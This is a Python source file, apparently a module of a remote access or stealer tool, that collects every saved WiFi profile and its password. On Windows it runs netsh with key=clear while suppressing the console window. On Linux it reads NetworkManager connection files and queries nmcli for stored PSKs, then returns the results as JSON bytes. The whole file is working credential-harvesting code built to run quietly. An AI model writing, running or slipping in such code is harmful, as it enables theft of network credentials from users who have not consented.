#!/usr/bin/env python3
"""WiFi profiles module — extract saved WiFi profiles and keys."""
import os
import re
import subprocess
import platform

def dump():
    """Dump all saved WiFi profiles and their keys."""
    system = platform.system()
    if system == "Windows":
        return _dump_windows()
    elif system == "Linux":
        return _dump_linux()
    return b"error: unsupported platform"

def _dump_windows():
    """Windows WiFi profile dump via netsh."""
    try:
        # Get list of profiles
        out = subprocess.check_output(
            ["netsh", "wlan", "show", "profiles"],
            text=True, creationflags=0x08000000
        )
        profiles = []
        for line in out.splitlines():
            m = re.search(r":\s+(.+)$", line)
            if m:
                profiles.append(m.group(1).strip())

        results = {}
        for profile in profiles:
            key = _get_key_windows(profile)
            results[profile] = key

        import json
        return json.dumps(results, indent=2).encode()
    except Exception as e:
        return f"error: {e}".encode()

def _get_key_windows(profile):
    """Get WiFi key for a specific profile."""
    try:
        out = subprocess.check_output(
            ["netsh", "wlan", "show", "profile", f"name={profile}", "key=clear"],
            text=True, creationflags=0x08000000
        )
        for line in out.splitlines():
            if "Key Content" in line or "Security Key" in line:
                m = re.search(r":\s+(.+)$", line)
                if m:
                    return m.group(1).strip()
        return "(no key / open network)"
    except:
        return "(error)"

def _dump_linux():
    """Linux WiFi profile dump from NetworkManager."""
    try:
        results = {}
        # NetworkManager stores connections in /etc/NetworkManager/system-connections/
        nm_dir = "/etc/NetworkManager/system-connections/"
        if os.path.isdir(nm_dir):
            for f in os.listdir(nm_dir):
                if f.endswith(".nmconnection"):
                    path = os.path.join(nm_dir, f)
                    try:
                        with open(path, "r") as fh:
                            content = fh.read()
                            # Extract SSID and password
                            ssid = ""
                            psk = ""
                            for line in content.split("\n"):
                                if line.startswith("ssid="):
                                    ssid = line[5:]
                                if line.startswith("psk="):
                                    psk = line[4:]
                            results[ssid or f] = psk or "(open)"
                    except PermissionError:
                        results[f] = "(needs root)"
                    except:
                        pass

        # Also try nmcli
        try:
            out = subprocess.check_output(
                ["nmcli", "-t", "-f", "NAME,TYPE", "connection", "show"],
                text=True, timeout=5
            )
            for line in out.splitlines():
                parts = line.split(":")
                if len(parts) >= 2 and "wifi" in parts[1]:
                    name = parts[0]
                    if name not in results:
                        # Try to get the password
                        try:
                            pw_out = subprocess.check_output(
                                ["nmcli", "-s", "connection", "show", name],
                                text=True, timeout=5
                            )
                            for pl in pw_out.splitlines():
                                if "802-11-wireless-security.psk" in pl:
                                    psk = pl.split(":")[-1].strip()
                                    results[name] = psk
                                    break
                        except:
                            results[name] = "(unknown)"
        except:
            pass

        import json
        return json.dumps(results, indent=2).encode()
    except Exception as e:
        return f"error: {e}".encode()
